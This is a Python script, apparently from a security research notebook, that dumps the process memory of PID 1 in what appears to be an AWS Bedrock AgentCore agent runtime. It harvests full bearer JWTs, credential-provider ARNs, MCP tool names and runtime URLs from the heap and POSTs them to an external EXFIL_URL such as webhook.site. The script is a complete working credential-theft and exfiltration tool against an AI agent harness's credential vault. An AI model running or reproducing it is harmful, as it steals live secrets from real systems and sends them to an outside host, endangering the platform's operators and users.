"""Notebook-14.1 — blind recon + exfil of vault-resolved credentials from PID 1.

Variant of pid1_mcp_blind_recon_exfil.py that specifically targets the
AgentCore Identity vault resolution path. In addition to the standard MCP
topology anchors, this script:

  1. Searches for credential-provider ARN patterns (proving the harness uses
     Identity vault, not inline Bearer).
  2. Classifies found Bearer tokens by their heap context into three residue
     surfaces:
       (A) httpx request buffer  — outbound to MCP server
       (B) httpx response buffer — inbound from Identity API
       (C) Python dict cache     — resolve_header_references cache
  3. Reports SHA-256 per surface so the notebook can prove three-way identity.

Env:
  EXFIL_URL — destination URL (e.g. webhook.site). Required.
"""
import hashlib
import json
import os
import re
import sys
import urllib.error
import urllib.request


ANCHORS = [
    ('HarnessRemoteMcpConfig', 'pydantic_remote_mcp_config'),
    ('HarnessTool', 'pydantic_harness_tool'),
    ('HarnessHeaders', 'pydantic_harness_headers'),
    ('HarnessToolType', 'pydantic_tool_type_enum'),
    ('bedrock-agentcore.us-east-1.amazonaws.com/runtimes/', 'agentcore_runtime_url_prefix'),
    ('HTTP/1.1 200 OK', 'http_response_status'),
    ('authorization: Bearer', 'authorization_header_lc'),
    ('Authorization: Bearer', 'authorization_header_tc'),
    ('server: uvicorn', 'uvicorn_server_header'),
    ('"method":"initialize"', 'mcp_initialize'),
    ('"method":"tools/list"', 'mcp_tools_list'),
    ('"method":"tools/call"', 'mcp_tools_call'),
    ('"protocolVersion":"2024-11-05"', 'mcp_protocol_version'),
    ('"toolSpec":{"name":"', 'bedrock_toolspec'),
    ('eyJraWQiOi', 'jwt_with_kid_first'),
    ('eyJhbGciOi', 'jwt_with_alg_first'),
    # Identity-vault-specific anchors
    ('credential-provider/', 'identity_credential_provider_arn'),
    ('credentialProviderArn', 'identity_provider_arn_key'),
    ('resolve_header_references', 'loopy_resolve_fn'),
    ('workloadIdentity', 'identity_workload_ref'),
    ('GetWorkloadAccessToken', 'identity_api_call'),
]

URL_RE = re.compile(
    rb'https://bedrock-agentcore\.[a-z0-9\-]+\.amazonaws\.com/runtimes/[A-Za-z0-9%_\-/.?=]+'
)
TOOLSPEC_RE = re.compile(rb'"toolSpec":\s*\{\s*"name":\s*"([A-Za-z0-9_\-]+)"')
MCP_TOOL_RE = re.compile(rb'"name":"([A-Za-z][A-Za-z0-9_\-]+)","description":"')
JWT_RE = re.compile(rb'eyJ[A-Za-z0-9_\-]{20,}\.eyJ[A-Za-z0-9_\-]{20,}\.[A-Za-z0-9_\-]{20,}')
CLASS_RE = re.compile(rb'(Harness[A-Z][A-Za-z0-9]+)')
CRED_PROVIDER_ARN_RE = re.compile(
    rb'arn:aws:bedrock-agentcore:[a-z0-9\-]+:\d{12}:credential-provider/[A-Za-z0-9_\-]+'
)

# Context markers to classify residue surfaces
REQUEST_BUF_MARKERS = (b'POST /runtimes/', b'authorization: Bearer', b'Authorization: Bearer')
RESPONSE_BUF_MARKERS = (b'HTTP/1.1 200', b'HTTP/1.0 200', b'content-type: application/json')
DICT_CACHE_MARKERS = (b'HarnessRemoteMcpConfig', b'resolve_header', b'remoteMcp')


def classify_surface(chunk, offset, token_bytes):
    """Classify which residue surface a token was found in based on surrounding context."""
    context_start = max(0, offset - 512)
    context_end = min(len(chunk), offset + len(token_bytes) + 512)
    context = chunk[context_start:context_end]

    if any(m in context for m in REQUEST_BUF_MARKERS):
        return 'httpx_request_buffer'
    if any(m in context for m in RESPONSE_BUF_MARKERS):
        return 'httpx_response_buffer'
    if any(m in context for m in DICT_CACHE_MARKERS):
        return 'python_dict_cache'
    return 'unknown_heap_region'


def scan_pid1():
    regions = []
    with open('/proc/1/maps', 'r') as f:
        for line in f:
            parts = line.split()
            if len(parts) < 5:
                continue
            addr_range, perms = parts[0], parts[1]
            path = parts[5] if len(parts) >= 6 else ''
            if not perms.startswith('rw-') or path:
                continue
            try:
                start_s, end_s = addr_range.split('-')
                regions.append((int(start_s, 16), int(end_s, 16)))
            except Exception:
                continue

    urls = set()
    bearers = {}  # sha256 -> {token, len, surfaces: []}
    tools = set()
    tool_types = set()
    class_names = set()
    cred_provider_arns = set()
    anchor_hits = {}

    KNOWN_TOOL_TYPES = (
        b'remote_mcp', b'inline_function', b'agentcore_browser',
        b'agentcore_code_interpreter', b'agentcore_gateway',
    )

    with open('/proc/1/mem', 'rb') as mem:
        for start, end in regions:
            try:
                mem.seek(start)
                chunk = mem.read(end - start)
            except Exception:
                continue

            for m in URL_RE.finditer(chunk):
                raw = m.group(0).decode('utf-8', errors='replace')
                urls.add(raw)

            for m in TOOLSPEC_RE.finditer(chunk):
                tools.add(m.group(1).decode('ascii', errors='replace'))
            for m in MCP_TOOL_RE.finditer(chunk):
                tools.add(m.group(1).decode('ascii', errors='replace'))

            for m in JWT_RE.finditer(chunk):
                tok = m.group(0)
                if len(tok) >= 600:
                    sha = hashlib.sha256(tok).hexdigest()
                    surface = classify_surface(chunk, m.start(), tok)
                    if sha not in bearers:
                        bearers[sha] = {
                            'token': tok.decode('ascii', errors='replace'),
                            'len': len(tok),
                            'sha256': sha,
                            'surfaces': [surface],
                        }
                    else:
                        if surface not in bearers[sha]['surfaces']:
                            bearers[sha]['surfaces'].append(surface)

            for tt in KNOWN_TOOL_TYPES:
                if tt in chunk:
                    tool_types.add(tt.decode('ascii'))

            for m in CLASS_RE.finditer(chunk):
                cn = m.group(1).decode('ascii', errors='replace')
                if cn != 'Harness':
                    class_names.add(cn)

            for m in CRED_PROVIDER_ARN_RE.finditer(chunk):
                cred_provider_arns.add(m.group(0).decode('ascii', errors='replace'))

            for needle_str, label in ANCHORS:
                needle_b = needle_str.encode('utf-8')
                count = chunk.count(needle_b)
                if count > 0:
                    anchor_hits[label] = anchor_hits.get(label, 0) + count

    # Dedupe URLs
    urls = {u for u in urls if not any(other.startswith(u) and other != u for other in urls)}

    bearer_list = sorted(bearers.values(), key=lambda b: -b['len'])

    print(f'SCAN_CLASSES_LOCAL={len(class_names)}')
    for cn in sorted(class_names):
        print(f'  CLASS={cn}')

    return {
        'urls': sorted(urls),
        'bearers': bearer_list,
        'tools': sorted(tools),
        'tool_types': sorted(tool_types),
        'cred_provider_arns': sorted(cred_provider_arns),
        'anchor_hits': anchor_hits,
    }


def main():
    exfil_url = os.environ.get('EXFIL_URL')
    if not exfil_url:
        print('EXFIL_FAIL=missing_EXFIL_URL')
        sys.exit(1)
    print(f'EXFIL_TARGET={exfil_url}')

    print('SCAN_START=1')
    topology = scan_pid1()
    print(f'SCAN_URLS={len(topology["urls"])}')
    print(f'SCAN_BEARERS={len(topology["bearers"])}')
    print(f'SCAN_TOOLS={len(topology["tools"])}')
    print(f'SCAN_TOOL_TYPES={len(topology["tool_types"])}')
    print(f'SCAN_CRED_PROVIDER_ARNS={len(topology["cred_provider_arns"])}')

    # Report per-bearer surface classification
    for i, b in enumerate(topology['bearers'], 1):
        print(f'BEARER[{i}]_LEN={b["len"]}')
        print(f'BEARER[{i}]_SHA256={b["sha256"]}')
        print(f'BEARER[{i}]_SURFACES={",".join(b["surfaces"])}')
        print(f'BEARER[{i}]_N_SURFACES={len(b["surfaces"])}')

    # Report credential-provider ARNs found (proves Identity vault is in use)
    for arn in topology['cred_provider_arns']:
        print(f'IDENTITY_VAULT_ARN={arn}')

    total = (
        len(topology['urls']) + len(topology['bearers']) + len(topology['tools'])
        + len(topology['tool_types']) + len(topology['cred_provider_arns'])
    )
    print(f'SCAN_TOTAL_ARTIFACTS={total}')

    payload = json.dumps({
        'event': 'IDENTITY_VAULT_RECON_EXFIL',
        'topology': topology,
    }).encode()

    req = urllib.request.Request(
        exfil_url,
        data=payload,
        headers={'Content-Type': 'application/json'},
        method='POST',
    )
    try:
        with urllib.request.urlopen(req, timeout=30) as resp:
            print(f'EXFIL_STATUS={resp.status}')
            print(f'EXFIL_BYTES_SENT={len(payload)}')
            print('EXFIL_VERDICT=POSTED')
    except urllib.error.HTTPError as e:
        print(f'EXFIL_STATUS={e.code}')
        print('EXFIL_VERDICT=FAIL')
    except Exception as e:
        print(f'EXFIL_ERROR={type(e).__name__}: {str(e)[:150]}')
        print('EXFIL_VERDICT=FAIL')


if __name__ == '__main__':
    main()
